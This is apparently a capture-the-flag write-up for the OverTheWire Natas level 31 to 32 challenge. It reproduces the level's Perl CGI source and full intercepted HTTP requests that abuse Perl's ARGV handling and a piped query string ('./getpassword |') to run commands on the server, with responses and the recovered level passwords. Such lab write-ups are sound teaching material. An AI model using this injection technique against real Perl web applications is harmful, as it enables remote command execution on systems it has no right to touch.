# Natas Level 31 → Level 32 lesser-known vulnerability in Perl CGI scripts

## Previous Flag
<b>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B</b>

## Goal
Username: natas32<br>
URL: http://natas32.natas.labs.overthewire.org<br>

CSV2HTML<br><br>
We all like .csv files.<br>
But isn't a nicely rendered and sortable table much cooler?<br>
This time you need to prove that you got code exec. There is a binary 👀 in the webroot that you need to execute.<br>

Select file to upload: Browse Upload

## What I learned
```
Same as previous but using Method 2

Server vulnerable to interpreting parameters as shell commands
    and it must not sanitize inputs like |, %20, ;

POST /index.pl?./getpassword%20| HTTP/1.1
    Decodes to:
        POST /index.pl?./getpassword | HTTP/1.1

Note: can't use cat to read files must do like above
```

## Solution
```
View source code
http://natas32.natas.labs.overthewire.org/index-source.html

/var/www/natas/natas32/index-source.pl
#!/usr/bin/perl
use CGI;
$ENV{'TMPDIR'}="/var/www/natas/natas32/tmp/";

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">
END

my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print <<END;

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.
    <br><br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
END
}

print <<END;
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
END

Burp Suite upload a empty.csv and Intercept on:
POST /index.pl?ls%20.%20| HTTP/1.1 👀
Host: natas32.natas.labs.overthewire.org
Content-Length: 375
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
Accept-Language: en-US,en;q=0.9
Origin: http://natas32.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymq5hjVyQWB3bXOMQ
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas32.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundarymq5hjVyQWB3bXOMQ 👀
Content-Disposition: form-data; name="file" 👀

ARGV 👀
------WebKitFormBoundarymq5hjVyQWB3bXOMQ
Content-Disposition: form-data; name="file"; filename="empty.csv"
Content-Type: text/csv


------WebKitFormBoundarymq5hjVyQWB3bXOMQ
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundarymq5hjVyQWB3bXOMQ--

Look at Response:
HTTP/1.1 200 OK
Date: Fri, 08 Aug 2025 16:31:55 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1882
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}
</style>

<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>.:
</th></tr><tr><td>bootstrap-3.3.6-dist
</td></tr><tr><td>getpassword 👀
</td></tr><tr><td>index-source.html
</td></tr><tr><td>index.pl
</td></tr><tr><td>jquery-1.12.3.min.js
</td></tr><tr><td>sorttable.js
</td></tr><tr><td>tmp
</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

Another Request:
POST /index.pl?./getpassword%20| HTTP/1.1 👀
Host: natas32.natas.labs.overthewire.org
Content-Length: 375
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
Accept-Language: en-US,en;q=0.9
Origin: http://natas32.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymq5hjVyQWB3bXOMQ
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas32.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundarymq5hjVyQWB3bXOMQ
Content-Disposition: form-data; name="file"

ARGV
------WebKitFormBoundarymq5hjVyQWB3bXOMQ
Content-Disposition: form-data; name="file"; filename="empty.csv"
Content-Type: text/csv

------WebKitFormBoundarymq5hjVyQWB3bXOMQ
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundarymq5hjVyQWB3bXOMQ--

Last Response:
HTTP/1.1 200 OK
Date: Fri, 08 Aug 2025 16:38:11 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1688
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>

<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ 🔐
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Flag
<b>2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ</b>

## Continue
[Continue](./Natas3233.md)